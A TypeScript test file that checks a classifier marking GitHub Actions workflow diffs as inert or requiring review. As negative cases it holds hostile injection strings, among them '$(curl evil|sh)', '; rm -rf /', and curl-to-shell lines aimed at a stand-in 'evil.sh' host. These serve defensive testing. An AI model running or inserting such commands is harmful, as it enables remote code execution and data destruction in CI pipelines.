import { describe, expect, it } from 'vitest';
import { loadConfig } from './classify';
import { inertWorkflowFiles } from './workflowInert';

const cfg = loadConfig(`${__dirname}/__fixtures__/config.fixture.yml`);

const WF = '.github/workflows/_publish-cloud-run.yml';

/** Build a minimal unified diff for one workflow file from added/removed lines. */
function diffFor(file: string, lines: string[]): string {
  return [`diff --git a/${file} b/${file}`, `--- a/${file}`, `+++ b/${file}`, '@@ -146,6 +146,7 @@', ...lines].join(
    '\n',
  );
}

describe('inertWorkflowFiles', () => {
  it('env-var forward (the FILES_ARCHIVE_MAX_BYTES case) → inert', () => {
    const diff = diffFor(WF, [
      "+            --set-env-vars=FILES_ARCHIVE_MAX_BYTES=${{ vars.FILES_ARCHIVE_MAX_BYTES || '' }}",
    ]);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([WF]);
  });

  it('renaming a forwarded var (remove old line, add new) → inert', () => {
    const diff = diffFor(WF, [
      '-            --set-env-vars=FILES_MAX=${{ vars.FILES_MAX }}',
      '+            --set-env-vars=FILES_ARCHIVE_MAX_BYTES=${{ vars.FILES_ARCHIVE_MAX_BYTES }}',
    ]);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([WF]);
  });

  // Pins the var-forward allow shape: only a bare `${{ vars.X }}` or a quoted
  // default is inert. Unquoted defaults, nested exprs, and comma-joined
  // multi-var (a vector for smuggling a second value) must stay Tier 3. If a
  // future edit loosens the regex, one of these flips and the diff is reviewed.
  it.each([
    ['+            --set-env-vars=FOO=${{ vars.FOO }}', true], // bare
    ['+            --set-env-vars=FOO=${{ env.FOO }}', true], // env. form
    ["+            --set-env-vars=FOO=${{ vars.FOO || 'x' }}", true], // safe literal default
    ["+            --set-env-vars=FOO=${{ vars.FOO || 'example.com' }}", true], // dotted literal default
    ['+            --set-env-vars=FOO=${{ vars.FOO || 8080 }}', false], // unquoted default
    ['+            --set-env-vars=FOO=${{ vars.A || vars.B }}', false], // nested expr
    ['+            --set-env-vars=FOO=${{ vars.FOO }},BAR=${{ vars.BAR }}', false], // multi-var
    // shell metacharacters in the default would substitute into a `run:` block — stay Tier 3
    ["+            --set-env-vars=FOO=${{ vars.FOO || '$(curl evil|sh)' }}", false], // command substitution
    ["+            --set-env-vars=FOO=${{ vars.FOO || '; rm -rf /' }}", false], // command separator
  ])('var-forward shape %s → inert=%s', (line, inert) => {
    expect(inertWorkflowFiles(diffFor(WF, [line]), cfg)).toEqual(inert ? [WF] : []);
  });

  it('blank line only → inert', () => {
    const diff = diffFor(WF, ['+']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([WF]);
  });

  it('comment line → NOT inert (a `#` line is shell text inside a run: block)', () => {
    const diff = diffFor(WF, ['+            # $(curl https://evil.sh | sh)']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });

  it('removed-only allowed line → inert (parses `-` lines too)', () => {
    const diff = diffFor(WF, ['-            --set-env-vars=FOO=${{ vars.FOO }}']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([WF]);
  });

  it('context (unchanged) lines are ignored, not counted against allow', () => {
    const diff = diffFor(WF, [
      '             runs-on: ubuntu-latest',
      '+            --set-env-vars=FOO=${{ vars.FOO }}',
    ]);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([WF]);
  });

  it('added secrets.* reference → NOT inert', () => {
    const diff = diffFor(WF, ['+            --set-env-vars=API_KEY=${{ secrets.API_KEY }}']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });

  it('multi-hunk: one non-inert hunk poisons the whole file → NOT inert', () => {
    const diff = [
      `diff --git a/${WF} b/${WF}`,
      `--- a/${WF}`,
      `+++ b/${WF}`,
      '@@ -10,1 +10,2 @@',
      '+            --set-env-vars=FOO=${{ vars.FOO }}',
      '@@ -50,1 +50,2 @@',
      '+      - run: echo hi',
    ].join('\n');
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });

  it('command injection appended to an allowed line → NOT inert (allow is full-line anchored)', () => {
    const diff = diffFor(WF, ['+            --set-env-vars=FOO=${{ vars.FOO }}; curl evil.sh | sh']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });

  it('new run: step → NOT inert', () => {
    const diff = diffFor(WF, ['+      - run: echo pwned']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });

  it('changed trigger (on:) → NOT inert', () => {
    const diff = diffFor(WF, ['+on: pull_request_target']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });

  it('changed permissions: scope → NOT inert', () => {
    const diff = diffFor(WF, ['+    permissions:', '+      contents: write']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });

  it('mixed: one allowed line + one secret line → NOT inert (whole-file gate)', () => {
    const diff = diffFor(WF, [
      '+            --set-env-vars=FOO=${{ vars.FOO }}',
      '+            --set-env-vars=API_KEY=${{ secrets.API_KEY }}',
    ]);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });

  it('non-workflow file with an env-var-like line → ignored (not a workflow)', () => {
    const diff = diffFor('server/cloud-run/src/foo.ts', ['+            --set-env-vars=FOO=${{ vars.FOO }}']);
    expect(inertWorkflowFiles(diff, cfg)).toEqual([]);
  });
});
